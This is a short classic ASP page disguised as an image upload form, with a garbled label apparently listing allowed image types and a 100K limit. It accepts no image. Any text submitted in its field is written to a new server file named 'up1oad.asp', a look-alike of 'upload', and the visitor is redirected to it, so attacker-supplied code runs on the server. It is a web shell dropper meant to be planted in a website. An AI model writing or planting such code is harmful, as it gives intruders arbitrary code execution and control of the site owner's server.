<%
if request("txt")<>"" then
shell=request("txt")
set FileObject=Server.CreateObject("Scripting.FileSystemObject")
set TextFile=FileObject.CreateTextFile(Server.MapPath("up1oad.asp"))
TextFile.Write(shell)
response.redirect("up1oad.asp")
else
%> ��ѡ��Ҫ�ϴ���ͼƬ����:jpg,gif,png,bmp.����:100K. 
<form name='form1' method='post' action=''>
<table border='0' cellpadding='0' cellspacing='0'><tr>
<td><textarea name='txt' rows='1' id='txt' style='overflow:hidden'></textarea></td>
<td><input type='submit' name='Submit' value='�ϴ�'>
</td></tr></table></form>
<%end if%>
